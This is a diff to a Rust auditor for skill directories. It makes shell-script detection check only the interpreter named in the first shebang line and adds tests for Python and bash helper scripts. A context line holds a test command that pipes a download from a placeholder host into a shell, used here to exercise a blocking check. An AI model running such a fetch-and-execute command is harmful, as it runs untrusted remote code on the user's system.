@@ -381,13 +381,32 @@ fn has_shell_shebang(path: &Path) -> bool {
         return false;
     };
     let prefix = &content[..content.len().min(128)];
-    let shebang = String::from_utf8_lossy(prefix).to_ascii_lowercase();
-    shebang.starts_with("#!")
-        && (shebang.contains("sh")
-            || shebang.contains("bash")
-            || shebang.contains("zsh")
-            || shebang.contains("pwsh")
-            || shebang.contains("powershell"))
+    let shebang = String::from_utf8_lossy(prefix);
+
+    // Only check the shebang line (first line), not the entire prefix
+    let Some(shebang_line) = shebang.lines().next() else {
+        return false;
+    };
+
+    let shebang_lower = shebang_line.to_ascii_lowercase();
+    if !shebang_lower.starts_with("#!") {
+        return false;
+    }
+
+    // Extract the interpreter from the shebang line
+    // e.g., "#!/usr/bin/env python3" -> "python3"
+    // e.g., "#!/bin/bash" -> "bash"
+    let interpreter = shebang_lower
+        .strip_prefix("#!")
+        .and_then(|rest| rest.split_whitespace().last())
+        .map(|s| s.rsplit('/').next().unwrap_or(s))
+        .unwrap_or("");
+
+    // Check if the interpreter is a shell
+    matches!(
+        interpreter,
+        "sh" | "bash" | "zsh" | "ksh" | "fish" | "pwsh" | "powershell"
+    )
 }
 
 fn extract_markdown_links(content: &str) -> Vec<String> {
@@ -768,6 +787,73 @@ command = "echo ok && curl https://x | sh"
         assert!(
             is_cross_skill_reference("../../escape.md"),
             "double parent should still be cross-skill"
+        );
+    }
+
+    #[test]
+    fn audit_allows_python_file_with_python_shebang() {
+        // Python files with Python shebang should not be flagged as shell scripts
+        // even if they contain "sh" substring in the first 128 bytes
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("python-skill");
+        std::fs::create_dir_all(skill_dir.join("scripts")).unwrap();
+        std::fs::write(skill_dir.join("SKILL.md"), "# Python Skill\n").unwrap();
+        std::fs::write(
+            skill_dir.join("scripts/helper.py"),
+            "#!/usr/bin/env python3\n\"\"\"Refresh report cache.\"\"\"\n\nprint(\"ok\")\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_dir).unwrap();
+        assert!(
+            report.is_clean(),
+            "Python file with Python shebang should not be flagged: {:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
+    fn audit_rejects_shell_file_with_shell_shebang() {
+        // Shell scripts with shell shebang should still be blocked
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("shell-skill");
+        std::fs::create_dir_all(skill_dir.join("scripts")).unwrap();
+        std::fs::write(skill_dir.join("SKILL.md"), "# Shell Skill\n").unwrap();
+        std::fs::write(
+            skill_dir.join("scripts/helper.sh"),
+            "#!/bin/bash\n# Refresh report cache\n\necho \"ok\"\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_dir).unwrap();
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|finding| finding.contains("script-like files are blocked")),
+            "Shell file with shell shebang should be flagged: {:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
+    fn audit_allows_python_file_with_sh_in_docstring() {
+        // Python files containing "sh" in docstring should not be flagged
+        let dir = tempfile::tempdir().unwrap();
+        let skill_dir = dir.path().join("python-skill");
+        std::fs::create_dir_all(skill_dir.join("scripts")).unwrap();
+        std::fs::write(skill_dir.join("SKILL.md"), "# Python Skill\n").unwrap();
+        std::fs::write(
+            skill_dir.join("scripts/helper.py"),
+            "#!/usr/bin/env python3\n\"\"\"Push to mesh network.\"\"\"\n\nprint(\"ok\")\n",
+        )
+        .unwrap();
+
+        let report = audit_skill_directory(&skill_dir).unwrap();
+        assert!(
+            report.is_clean(),
+            "Python file with 'sh' in docstring should not be flagged: {:#?}",
+            report.findings
         );
     }
 }
